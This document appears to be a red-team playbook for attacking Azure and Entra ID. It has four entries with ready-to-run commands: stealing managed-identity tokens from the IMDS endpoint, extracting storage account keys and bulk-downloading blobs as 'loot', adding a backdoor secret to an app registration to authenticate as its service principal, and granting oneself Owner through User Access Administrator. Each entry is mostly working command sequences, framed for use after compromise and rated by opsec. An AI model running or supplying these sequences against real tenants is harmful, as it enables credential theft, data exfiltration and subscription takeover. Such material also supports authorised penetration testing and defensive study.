# Cloud – Azure / EntraID Attacks

### Azure Managed Identity Token Theft via IMDS [added: 2026-04]
- **Tags:** #Azure #ManagedIdentity #IMDS #TokenTheft #AzureVM #AppService #AzureFunction #CloudCredTheft
- **Trigger:** Compromised Azure VM, App Service, or Function App and want to steal the managed identity's access token for lateral movement
- **Prereq:** Shell/RCE on an Azure resource with a managed identity assigned + IMDS endpoint (169.254.169.254) reachable from the host
- **Yields:** Azure access token (Bearer JWT) for the managed identity, usable to call ARM, Key Vault, Storage, and other Azure APIs
- **Opsec:** Low
- **Context:** Azure resources with managed identities expose tokens via the Instance Metadata Service. From a compromised VM or App Service, query IMDS to get an access token scoped to whatever the identity has access to — no credentials stored on disk.
- **Payload/Method:**
  ```bash
  # From Azure VM — query IMDS for access token (resource = ARM)
  curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
    | jq .

  # From App Service / Function App — use IDENTITY_ENDPOINT env var
  curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
    "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/" \
    | jq .

  # Request token for other resources (Key Vault, Graph, Storage)
  curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
    | jq .

  curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com" \
    | jq .

  # Use the stolen token
  export TOKEN=$(curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
    | jq -r .access_token)
  az account get-access-token  # compare with managed identity token
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq .
  ```

### Azure Storage Account Key Extraction [added: 2026-04]
- **Tags:** #Azure #StorageAccount #StorageKeys #BlobAccess #AzCLI #DataExfil #CloudStorage #AzureStorage
- **Trigger:** Have authenticated Azure CLI session or compromised identity with storage account permissions — want to extract storage keys for full blob/queue/table access
- **Prereq:** `az` CLI authenticated + `Microsoft.Storage/storageAccounts/listkeys/action` permission on the target storage account
- **Yields:** Storage account access keys (key1/key2) granting full read/write to all blobs, queues, tables, and file shares in the account
- **Opsec:** Med
- **Context:** Storage account keys are equivalent to root access for that storage account. If the compromised identity can list keys, you get persistent full access without needing Azure AD tokens. Keys don't expire unless rotated.
- **Payload/Method:**
  ```bash
  # Enumerate storage accounts in the subscription
  az storage account list --query "[].{Name:name, RG:resourceGroup, Location:location}" -o table

  # Extract access keys for a target storage account
  az storage account keys list --account-name <STORAGE_ACCT> --resource-group <RG> -o table

  # Use key to list all blob containers
  az storage container list --account-name <STORAGE_ACCT> --account-key <KEY> -o table

  # List blobs in a container
  az storage blob list --container-name <CONTAINER> --account-name <STORAGE_ACCT> --account-key <KEY> -o table

  # Download interesting blobs
  az storage blob download --container-name <CONTAINER> --name <BLOB_NAME> \
    --account-name <STORAGE_ACCT> --account-key <KEY> --file ./loot.dat

  # Bulk download entire container
  az storage blob download-batch --destination ./loot/ --source <CONTAINER> \
    --account-name <STORAGE_ACCT> --account-key <KEY>
  ```

### EntraID Application Secret / Certificate Abuse [added: 2026-04]
- **Tags:** #EntraID #AzureAD #AppRegistration #ClientCredentials #ServicePrincipal #OAuth2 #SecretAbuse #CertificateAuth
- **Trigger:** Discovered Azure AD app registrations with client secrets or certificates — want to authenticate as the service principal for privilege escalation
- **Prereq:** Access to enumerate app registrations (Graph API or `az ad app list`) + ability to read/add credentials on the app, OR found existing secret/certificate in config files, Key Vault, or env vars
- **Yields:** OAuth2 access token as the service principal, inheriting all its role assignments and API permissions (may include Mail.Read, Directory.ReadWrite.All, etc.)
- **Opsec:** Med
- **Context:** App registrations often have overprivileged API permissions or Azure RBAC roles. If you find an existing secret in source code, env vars, or Key Vault, or if you can add a new credential to the app, you can authenticate as that service principal and inherit its permissions.
- **Payload/Method:**
  ```bash
  # Enumerate app registrations (look for ones with credentials)
  az ad app list --all --query "[?passwordCredentials || keyCredentials].{AppId:appId, DisplayName:displayName, PassCreds:length(passwordCredentials), KeyCreds:length(keyCredentials)}" -o table

  # If you can add a new secret to an app you have Owner rights on
  az ad app credential reset --id <APP_OBJECT_ID> --append --display-name "Pentest" --years 1

  # Authenticate using client_credentials grant (secret-based)
  TENANT_ID="<TENANT_ID>"
  CLIENT_ID="<APP_CLIENT_ID>"
  CLIENT_SECRET="<SECRET_VALUE>"

  curl -s -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$CLIENT_ID" \
    -d "client_secret=$CLIENT_SECRET" \
    -d "scope=https://graph.microsoft.com/.default" \
    -d "grant_type=client_credentials" | jq .

  # Use the token to call Graph API
  TOKEN=$(curl -s -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET&scope=https://graph.microsoft.com/.default&grant_type=client_credentials" \
    | jq -r .access_token)

  # Enumerate users, groups, directory roles
  curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/users" | jq .
  curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/groups" | jq .
  curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/directoryRoles" | jq .
  ```

### Azure RBAC Escalation via Custom Role / User Access Administrator [added: 2026-04]
- **Tags:** #Azure #RBAC #PrivEsc #UserAccessAdministrator #RoleAssignment #CustomRole #ARM #SubscriptionTakeover
- **Trigger:** Compromised identity has User Access Administrator or a custom role with `Microsoft.Authorization/roleAssignments/write` — can escalate to Owner/Contributor
- **Prereq:** Azure identity with `Microsoft.Authorization/roleAssignments/write` permission at the target scope (subscription, resource group, or resource) + knowledge of your own principal ID
- **Yields:** Owner or Contributor role on the target scope, granting full control over all Azure resources within that scope
- **Opsec:** High
- **Context:** User Access Administrator can assign any role including Owner. If you land on an identity with this role (often assigned broadly for automation), you can grant yourself Owner on the subscription. This is one of the most common Azure privilege escalation paths.
- **Payload/Method:**
  ```bash
  # Check current role assignments for the compromised identity
  az role assignment list --assignee <PRINCIPAL_ID> -o table

  # Check if you have User Access Administrator or similar
  az role assignment list --assignee <PRINCIPAL_ID> --query "[?roleDefinitionName=='User Access Administrator']" -o table

  # Get your own principal ID (object ID)
  MY_OBJECT_ID=$(az ad signed-in-user show --query id -o tsv)

  # Assign Owner role to yourself at subscription scope
  SUBSCRIPTION_ID=$(az account show --query id -o tsv)
  az role assignment create \
    --role "Owner" \
    --assignee-object-id "$MY_OBJECT_ID" \
    --scope "/subscriptions/$SUBSCRIPTION_ID"

  # Or via direct ARM API call (if az cli is unavailable)
  ROLE_DEF_ID="/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635"  # Owner
  curl -s -X PUT \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleAssignments/$(uuidgen)?api-version=2022-04-01" \
    -d "{\"properties\":{\"roleDefinitionId\":\"$ROLE_DEF_ID\",\"principalId\":\"$MY_OBJECT_ID\"}}"

  # Verify escalation
  az role assignment list --assignee "$MY_OBJECT_ID" -o table
  ```
